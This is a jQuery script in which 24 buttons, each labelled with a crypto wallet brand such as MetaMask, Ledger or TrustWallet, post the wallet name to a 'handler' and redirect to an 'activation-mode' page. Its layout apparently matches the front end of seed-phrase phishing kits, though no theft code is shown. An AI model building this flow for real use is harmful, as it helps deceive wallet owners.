$(document).ready(function () {
  $("#wl1 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "Walletconnect",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });


  $("#wl2 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "TrustWallet",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });




  $("#wl3 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "AAVE",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });




  $("#wl4 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "Ledger",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });

  $("#wl5 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "Enjin",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });


  $("#wl6 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "MyEtherWallet",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });



  $("#wl7 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "BinanceSmartChain",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });


  $("#wl8 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "MetaMask",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });
  // 
  $("#wl9 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "Digitex",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });
  $("#wl10 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "Coinbase",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });
  $("#wl11 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "Aethereum",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });
  $("#wl12 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "Portis",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });
  $("#wl13 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "Formatic",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });


  $("#wl14 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "Exodus",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });


  $("#wl15 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "Defiat",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });




  $("#wl16 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "Skale",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });


  $("#wl17 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "Coinomi",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });



  $("#wl18 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "Atomic",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });





  $("#wl19 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "Tron",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });


  $("#wl20 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "BandProtocol",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });



  $("#wl21 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "EOS",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });


  $("#wl22 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "WAX",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });


  $("#wl23 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "Zilliqa",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });

  $("#wl24 a").click(function (e) {
    e.preventDefault();
    // let data=$(this).attr("data");
    // alert(data)
    $.ajax({
      type: "post",
      url: "handler",
      data: {
        mode: "Polkadot",
      },
      dataType: "text",
      success: function (response) {
        window.location.href = "activation-mode";
      },
    });
  });

});
